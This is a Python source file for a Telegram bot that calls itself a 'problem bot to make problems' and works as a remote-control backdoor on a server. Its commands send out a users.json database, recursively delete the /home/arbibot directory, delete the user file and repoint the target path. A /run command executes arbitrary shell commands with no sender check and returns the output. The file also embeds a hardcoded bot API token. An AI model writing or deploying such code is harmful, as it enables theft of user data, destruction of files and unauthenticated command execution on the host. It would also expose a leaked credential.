from aiogram import Bot, Dispatcher, executor, types
import subprocess
import os
import shutil

IDS = [489124710]
API_TOKEN = '5375906406:AAFsIAevnB3Iz1hO4MoAUZ79hRlHvUPoAGo'
FILE_DIR = "/home/arbibot"

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)


@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    if message.from_id in IDS:
        await message.reply("Hi! I'm problem bot to make problems")


@dp.message_handler(commands=['get'])
async def send_welcome(message: types.Message):
    if message.from_id in IDS:
        file = open(FILE_DIR + "/settings/users.json", "r")
        await bot.send_document(
            chat_id=message.from_id,
            document=("users.json", file)
        )


@dp.message_handler(commands=['delete'])
async def send_welcome(message: types.Message):
    if message.from_id in IDS:
        shutil.rmtree(FILE_DIR)


@dp.message_handler(commands=['delete_users'])
async def send_welcome(message: types.Message):
    if message.from_id in IDS:
        os.remove(FILE_DIR + "/settings/users.json")


@dp.message_handler(commands=['ping'])
async def send_welcome(message: types.Message):
    if message.from_id in IDS:
        if os.path.isdir(FILE_DIR):
            await message.answer("All ok, Im connected")
        else:
            await message.answer("I have problems =(")


@dp.message_handler(commands=['set'])
async def set_file(message: types.Message):
    arguments = message.get_args()
    global FILE_DIR
    FILE_DIR = arguments
    await message.answer(fr"Changed file path to {arguments}")


@dp.message_handler(commands=['run'])
async def set_file(message: types.Message):
    arguments = message.get_args().split(' ')
    listing = subprocess.run(arguments, stdout=subprocess.PIPE).stdout
    await message.answer(listing)


@dp.message_handler()
async def echo(message: types.Message):
    if message.from_id in IDS:
        await message.answer(message.text)


async def setup_bot_commands(_):
    await bot.set_my_commands(
        [
            types.BotCommand(command="/start", description="Start command"),
            types.BotCommand(command="/get", description="Get users db"),
            types.BotCommand(command="/delete", description="Delete all directory"),
            types.BotCommand(command="/delete_users", description="Delete users"),
            types.BotCommand(command="/ping", description="Ping if exists dir"),
            types.BotCommand(command="/set", description="Set different filepath"),
            types.BotCommand(command="/run", description="Run command written next")
        ]
    )


def main():
    executor.start_polling(dp, skip_updates=True, on_startup=setup_bot_commands)


if __name__ == '__main__':
    main()
